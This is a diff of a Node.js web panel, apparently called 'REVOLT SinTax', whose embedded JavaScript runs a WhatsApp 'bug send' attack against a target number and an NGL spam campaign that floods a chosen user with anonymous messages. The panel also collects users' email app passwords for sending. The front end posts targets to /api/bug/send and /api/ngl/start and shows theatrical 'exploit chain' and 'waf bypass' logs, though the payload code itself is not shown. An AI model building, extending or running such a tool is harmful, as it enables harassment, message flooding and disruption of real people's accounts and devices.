   const st = document.getElementById('chatRoomStatus');
+  ov.classList.add('open');
   if (!chatFrameLoaded) {
     st.textContent = 'loading ' + CHAT_URL + '...';
     f.src = CHAT_URL;
     f.onload = () => { st.textContent = '● online'; };
-    f.onerror = () => { st.textContent = '✗ gagal load'; };
+    f.onerror = () => { st.textContent = '✗ gagal'; };
     chatFrameLoaded = true;
+  } else {
+    st.textContent = '● online';
   }
 }
+function closeChatRoom(){
+  document.getElementById('chat-room-overlay').classList.remove('open');
+}
 
-// ═══ SENDER STATE ═══
+// ═══ SENDER STATE (WA) ═══
 let activeSenders = [];
 function updateSenderUI(){
   document.getElementById('activeBadge').textContent = activeSenders.length + ' ACTIVE';
@@ -1147,7 +1404,59 @@ function updateSenderUI(){
 }
 function removeSender(idx){ activeSenders.splice(idx,1); updateSenderUI(); }
 
-// ═══ REAL PAIRING ═══
+// ═══ NGL CREDENTIALS ═══
+async function loadNglCredStatus(){
+  if (!CURRENT_USER) return;
+  const el = document.getElementById('nglCredStatus');
+  const priv = document.getElementById('nglPrivateStatus');
+  try {
+    const r = await fetch('/api/ngl/sender?user=' + encodeURIComponent(CURRENT_USER));
+    const d = await r.json();
+    if (d.has){
+      el.className = 'ngl-cred-status';
+      el.innerHTML = '✅ Tersimpan untuk <b>' + CURRENT_USER + '</b><br>Email: <b>' + (d.emailMasked || '-') + '</b>';
+      document.getElementById('nglCredEmail').value = d.email || '';
+      priv.textContent = '● ' + (d.emailMasked || 'set');
+      priv.className = 'st';
+    } else {
+      el.className = 'ngl-cred-status warn';
+      el.innerHTML = '⚠ Belum ada kredensial NGL. Isi email & app password di bawah, lalu tekan ENTER.';
+      priv.textContent = '● Belum diisi';
+      priv.className = 'st warn';
+    }
+  } catch(_) {
+    el.textContent = '⚠ Gagal memuat status.';
+  }
+}
+
+async function saveNglCred(){
+  const email = document.getElementById('nglCredEmail').value.trim();
+  const pass = document.getElementById('nglCredPass').value.trim();
+  const btn = document.getElementById('nglCredBtn');
+  if (!CURRENT_USER) { alert('Login dulu.'); return; }
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert('Email tidak valid.'); return; }
+  if (pass.length < 4) { alert('App2Password minimal 4 karakter.'); return; }
+  btn.disabled = true; btn.textContent = 'MENYIMPAN...';
+  try {
+    const r = await fetch('/api/ngl/sender', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ user: CURRENT_USER, email, password: pass }),
+    });
+    const d = await r.json();
+    if (!d.ok) { alert('Gagal: ' + (d.error||'unknown')); btn.disabled = false; btn.textContent = 'ENTER'; return; }
+    document.getElementById('nglCredPass').value = '';
+    await loadNglCredStatus();
+    showWhatsAppToast('NGL credentials tersimpan');
+  } catch (e) { alert('Network error: ' + e.message); }
+  btn.disabled = false; btn.textContent = 'ENTER';
+}
+
+function clearNglCred(){
+  document.getElementById('nglCredEmail').value = '';
+  document.getElementById('nglCredPass').value = '';
+}
+
+// ═══ WA PAIRING ═══
 let pairPoll = null;
 async function processAddSender(){
   const num = document.getElementById('senderNumber').value.trim().replace(/\D/g,'');
@@ -1241,7 +1550,7 @@ function showWhatsAppToast(msg){
   setTimeout(() => { t.classList.remove('show'); t.classList.add('hide'); }, 5000);
 }
 
-// ═══ REAL BUG SEND ═══
+// ═══ BUG SEND ═══
 const METHOD_LOGS = [
   ['Injecting payload #1...', 'loading 32KB buffer...', 'payload injected ok'],
   ['Bypassing firewall...', 'spoofing TCP header...', 'waf bypass — success'],
@@ -1253,7 +1562,6 @@ const METHOD_LOGS = [
   ['Finalizing exploit chain...', 'verifying delivery...', 'DONE — bug sent'],
 ];
 const METHOD_WARN = [2, 5, 7];
-const TOTAL_METHODS = 8;
 
 async function startSendingProcess(){
   const popup = document.getElementById('loadingPopup');
@@ -1286,28 +1594,25 @@ async function startSendingProcess(){
   termNoPre('╚══════════════════════════════════════╝', 'ok');
   term('target: ' + target, 'info');
   term('sender: ' + senderUsed, 'info');
-  term('metode total: 8', 'info');
   termNoPre('─────────────────────────────────────', 'dim');
 
-  let realResult = null;
   const realPromise = fetch('/api/bug/send', {
     method: 'POST', headers: {'Content-Type':'application/json'},
     body: JSON.stringify({ target: target, method: 'delay_low' }),
   }).then(x => x.json()).catch(e => ({ ok:false, error:'network: ' + e.message }));
 
   function runStep(){
-    if (current > TOTAL_METHODS) return finishAndShow();
+    if (current > 8) return finishAndShow();
     methodText.className = 'method-status running';
-    methodText.textContent = 'Metode ' + current + ' dari ' + TOTAL_METHODS + '...';
+    methodText.textContent = 'Metode ' + current + ' dari 8...';
     const logs = METHOD_LOGS[current-1];
     const isWarn = METHOD_WARN.includes(current);
-    termNoPre('', '');
-    termNoPre('▶ METHOD ' + current + '/8', 'info');
+    termNoPre('', ''); termNoPre('▶ METHOD ' + current + '/8', 'info');
     term(logs[0], isWarn ? 'warn' : '');
     const stepStart = Date.now();
     const stepDuration = 550 + Math.random() * 350;
-    const baseProgress = ((current-1)/TOTAL_METHODS)*100;
-    const targetProgress = (current/TOTAL_METHODS)*100;
+    const baseProgress = ((current-1)/8)*100;
+    const targetProgress = (current/8)*100;
     const tick = setInterval(() => {
       const elapsed = Date.now() - stepStart;
       const ratio = Math.min(elapsed/stepDuration, 1);
@@ -1319,7 +1624,7 @@ async function startSendingProcess(){
     setTimeout(() => {
       clearInterval(tick);
       term(logs[2], 'ok');
-      const p = Math.round((current/TOTAL_METHODS)*100);
+      const p = Math.round((current/8)*100);
       fill.style.width = p + '%'; pct.textContent = p + '%';
       current++;
       setTimeout(runStep, 220);
@@ -1327,7 +1632,7 @@ async function startSendingProcess(){
   }
 
   async function finishAndShow(){
-    realResult = await realPromise;
+    const realResult = await realPromise;
     const duration = ((Date.now() - startTime)/1000).toFixed(1);
     const timeStr = new Date().toLocaleString('id-ID', {day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
     const ok = realResult && realResult.ok;
@@ -1337,11 +1642,9 @@ async function startSendingProcess(){
     if (ok){
       term('ALL 8 METHODS COMPLETED', 'ok');
       term('BUG DELIVERED → ' + target, 'ok');
-      term('status: SUCCESS ✓', 'ok');
       methodText.className = 'method-status done';
       methodText.textContent = 'PROSES SELESAI — 100%';
       document.getElementById('repHeader').textContent = '✔ BUG TERKIRIM!';
-      document.getElementById('repHeader').classList.remove('fail');
     } else {
       term('ERROR: ' + errMsg, 'err');
       methodText.className = 'method-status';
@@ -1355,15 +1658,12 @@ async function startSendingProcess(){
     document.getElementById('repSender').textContent = senderTag + ' → ' + senderUsed;
     document.getElementById('repMethod').textContent = ok ? '8/8 — SUCCESS' : '8/8 — FAILED';
     document.getElementById('repDelivered').textContent = ok ? '100%' : '0%';
-    document.getElementById('repDelivered').className = 'v ' + (ok ? 'good' : 'warn');
-    document.getElementById('repPackets').textContent = ok ? ((32+Math.floor(Math.random()*40)) + ' paket') : '0 paket';
     document.getElementById('repDuration').textContent = duration + ' detik';
     document.getElementById('repStatus').textContent = ok ? 'DELIVERED ✓' : 'FAILED ✗';
-    document.getElementById('repStatus').className = 'v ' + (ok ? 'good' : 'warn');
     document.getElementById('repTime').textContent = timeStr;
     document.getElementById('repDesc').innerHTML = ok
-      ? 'Bug <b>viewOnce interactive</b> berhasil dikirim ke <span class="hl">' + target + '</span> via <span class="hl">' + senderTag + '</span> (' + senderUsed + '). Durasi <b>' + duration + ' detik</b>.'
-      : 'Pengiriman gagal: <b>' + errMsg + '</b>. Pastikan sender sudah <b>connected</b> di menu Bug Sender, lalu coba ulang.';
+      ? 'Bug <b>viewOnce interactive</b> berhasil dikirim ke <span class="hl">' + target + '</span>.'
+      : 'Pengiriman gagal: <b>' + errMsg + '</b>.';
     report.classList.add('show');
     termOut.scrollTop = termOut.scrollHeight;
     setTimeout(() => popup.classList.remove('active'), 9000);
@@ -1372,9 +1672,17 @@ async function startSendingProcess(){
   setTimeout(runStep, 350);
 }
 
-// ═══ NGL SPAM — FIXED + POPUP ═══
+// ═══ NGL SPAM ═══
 let nglCount = 100;
+let nglSenderMode = 'private';
+
 function selectNglCount(el){document.querySelectorAll('.ngl-count-btn').forEach(b=>b.classList.remove('active'));el.classList.add('active');nglCount=parseInt(el.dataset.count);}
+function selectNglSender(el){
+  document.querySelectorAll('.ngl-sender-opt').forEach(o=>o.classList.remove('active'));
+  el.classList.add('active');
+  nglSenderMode = el.dataset.mode;
+}
+
 const NGL_RANDOM_MSGS=['kamu cantik banget hari ini 🌸','jangan lupa makan ya 🍔','semangat terus! 💪','kamu keren tau 😎','apa kabar? 👋','sehat selalu ya 🍀','suara kamu enak didengar 🎧','kamu suka kucing ga? 🐱','jangan sedih terus ya 🌈','kamu orang baik 🥺','senyum dong 😊','kamu inspiratif! ✨','tidur jangan malem ya 😴','kamu hebat 💯','tetap jadi dirimu sendiri 🌟'];
 function randomNglMessage(){document.getElementById('nglMessage').value=NGL_RANDOM_MSGS[Math.floor(Math.random()*NGL_RANDOM_MSGS.length)];}
 
@@ -1386,7 +1694,6 @@ function nglLogUI(text, cls){
   box.appendChild(d); box.scrollTop = box.scrollHeight;
   while (box.children.length > 200) box.removeChild(box.firstChild);
 }
-
 function nglPopupLog(text, cls){
   const box = document.getElementById('nglPopupLog');
   const d = document.createElement('div');
@@ -1395,13 +1702,8 @@ function nglPopupLog(text, cls){
   box.appendChild(d); box.scrollTop = box.scrollHeight;
   while (box.children.length > 120) box.removeChild(box.firstChild);
 }
-
 let nglPollTimer = null;
-
-function closeNglPopup(){
-  // popup bisa ditutup manual tanpa stop campaign
-  document.getElementById('nglPopup').classList.remove('active');
-}
+function closeNglPopup(){ document.getElementById('nglPopup').classList.remove('active'); }
 
 async function startNglSpam(){
   const target = document.getElementById('nglTarget').value.trim();
@@ -1409,15 +1711,19 @@ async function startNglSpam(){
   if (!target){ alert('Isi target NGL dulu!'); return; }
   if (!message){ alert('Isi pesan dulu!'); return; }
 
-  // reset logs & stats
+  if (nglSenderMode === 'private'){
+    const r = await fetch('/api/ngl/sender?user=' + encodeURIComponent(CURRENT_USER)).then(x=>x.json()).catch(()=>({has:false}));
+    if (!r.has){ alert('Private sender belum diisi. Buka Bug Sender → NGL SENDER CREDENTIALS, isi email & app2password.'); return; }
+  }
+
   document.getElementById('nglLog').innerHTML = '';
   document.getElementById('nglOk').textContent = '0';
   document.getElementById('nglErr').textContent = '0';
   document.getElementById('nglBatch').textContent = '0 / ' + nglCount;
 
-  // POPUP — muncul langsung di tengah
   const popup = document.getElementById('nglPopup');
   document.getElementById('nglPopupTarget').textContent = '@' + target.replace(/^https?:\/\/ngl\.link\//,'').replace(/^@/,'');
+  document.getElementById('nglPopupMode').textContent = nglSenderMode.toUpperCase();
   document.getElementById('nglPopupOk').textContent = '0';
   document.getElementById('nglPopupErr').textContent = '0';
   document.getElementById('nglPopupProg').textContent = '0 / ' + nglCount;
@@ -1426,6 +1732,7 @@ async function startNglSpam(){
   document.getElementById('nglPopupLog').innerHTML = '';
   nglPopupLog('[system] booting ngl-engine...', 'info');
   nglPopupLog('[system] target: ' + target, 'info');
+  nglPopupLog('[system] mode: ' + nglSenderMode.toUpperCase(), 'info');
   nglPopupLog('[system] total: ' + nglCount + ' pesan', 'info');
   popup.classList.add('active');
 
@@ -1433,12 +1740,9 @@ async function startNglSpam(){
   document.getElementById('nglStartBtn').style.display = 'none';
   document.getElementById('nglStopBtn').style.display = 'flex';
 
-  nglLogUI('[system] starting campaign...', 'info');
-  nglPopupLog('[system] POST /api/ngl/start...', 'info');
-
   const r = await fetch('/api/ngl/start', {
     method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ username: target, message, total: nglCount }),
+    body: JSON.stringify({ username: target, message, total: nglCount, senderMode: nglSenderMode, user: CURRENT_USER }),
   }).then(x => x.json()).catch(() => ({ ok:false, error:'Network error' }));
 
   if (!r.ok){
@@ -1448,29 +1752,25 @@ async function startNglSpam(){
     return;
   }
 
-  nglLogUI('campaign started → @' + r.target + ' × ' + r.total, 'ok');
-  nglPopupLog('[ok] campaign started → @' + r.target, 'ok');
+  nglLogUI('campaign → @' + r.target + ' × ' + r.total + ' [' + r.mode + ']', 'ok');
+  nglPopupLog('[ok] campaign start — ' + r.mode.toUpperCase(), 'ok');
 
   if (nglPollTimer) clearInterval(nglPollTimer);
   let lastSeen = 0;
   nglPollTimer = setInterval(async () => {
     const s = await fetch('/api/ngl/status').then(x => x.json()).catch(() => null);
     if (!s) return;
-
-    // update stats utama + popup
     document.getElementById('nglOk').textContent = s.counter;
     document.getElementById('nglErr').textContent = s.failed;
     document.getElementById('nglBatch').textContent = (s.counter + s.failed) + ' / ' + s.total;
     document.getElementById('nglPopupOk').textContent = s.counter;
     document.getElementById('nglPopupErr').textContent = s.failed;
     document.getElementById('nglPopupProg').textContent = (s.counter + s.failed) + ' / ' + s.total;
-
     const done = s.counter + s.failed;
-    const pct = s.total ? Math.min(100, Math.round((done / s.total) * 100)) : 0;
-    document.getElementById('nglPopupFill').style.width = pct + '%';
-    document.getElementById('nglPopupPct').textContent = pct + '%';
+    const pctv = s.total ? Math.min(100, Math.round((done / s.total) * 100)) : 0;
+    document.getElementById('nglPopupFill').style.width = pctv + '%';
+    document.getElementById('nglPopupPct').textContent = pctv + '%';
 
-    // sync log ke kedua terminal
     const newLogs = s.logs.slice(lastSeen);
     newLogs.forEach(l => {
       const cls = l.type === 'success' ? 'ok' : l.type === 'error' ? 'err' : l.type === 'warn' ? 'warn' : 'info';
@@ -1495,13 +1795,11 @@ async function startNglSpam(){
     }
   }, 1000);
 }
-
 function resetNglButtons(){
   document.getElementById('nglStartBtn').disabled = false;
   document.getElementById('nglStartBtn').style.display = 'flex';
   document.getElementById('nglStopBtn').style.display = 'none';
 }
-
 async function stopNglSpam(){
   await fetch('/api/ngl/stop',{method:'POST'}).catch(()=>{});
   if (nglPollTimer){ clearInterval(nglPollTimer); nglPollTimer = null; }
@@ -1510,8 +1808,18 @@ async function stopNglSpam(){
   resetNglButtons();
 }
 
-updateSenderUI();
-selectNglCount(document.querySelector('.ngl-count-btn.active'));
+// auto-restore session
+(function(){
+  const u = localStorage.revolt_user, t = localStorage.revolt_token;
+  if (u && t) {
+    CURRENT_USER = u; CURRENT_TOKEN = t;
+    document.getElementById('userNameDisplay').textContent = u.toUpperCase() + ' ⭐';
+    document.getElementById('userInitial').textContent = u.charAt(0).toUpperCase();
+    document.getElementById('login-view').style.display = 'none';
+    document.getElementById('appContainer').style.display = 'flex';
+    initAfterLogin();
+  }
+})();
 </script>
 </body>
 </html>`;
@@ -1525,14 +1833,13 @@ app.get('/health', (req, res) => res.json({ ok: true, port: PORT, chatUrl: CHAT_
 // ═══════════════════════════════════════════════════════
 //  START
 // ═══════════════════════════════════════════════════════
-app.listen(PORT, '0.0.0.0', () => {
-  console.log('╔══════════════════════════════════════╗');
-  console.log('║  REVOLT SinTax + NGL + WA + ChatRoom  ║');
-  console.log('╚══════════════════════════════════════╝');
-  console.log('✓ Server     → http://127.0.0.1:' + PORT);
-  console.log('✓ NGL start  → POST /api/ngl/start');
-  console.log('✓ NGL status → GET  /api/ngl/status');
-  console.log('✓ WA pair    → POST /api/wa/pair');
-  console.log('✓ Bug send   → POST /api/bug/send');
-  console.log('✓ Chat room  → ' + CHAT_URL);
+app.listen(PORT, '10.39.240.94', () => {
+  console.log('╔══════════════════════════════════════════╗');
+  console.log('║  REVOLT SinTax + Bot + NGL + ChatRoom   ║');
+  console.log('╚══════════════════════════════════════════╝');
+  console.log(`✓ Panel     → http://10.39.240.94:${PORT}`);
+  console.log(`✓ Chat URL  → ${CHAT_URL}`);
+  console.log(`✓ TG Bot    → @... (token ${BOT_TOKEN.slice(0,12)}…)`);
+  console.log(`✓ Owner     → ${OWNER_ID || '(any user boleh /adduser)'}`);
+  console.log('  Commands bot: /start /adduser /listuser /history /help');
 });
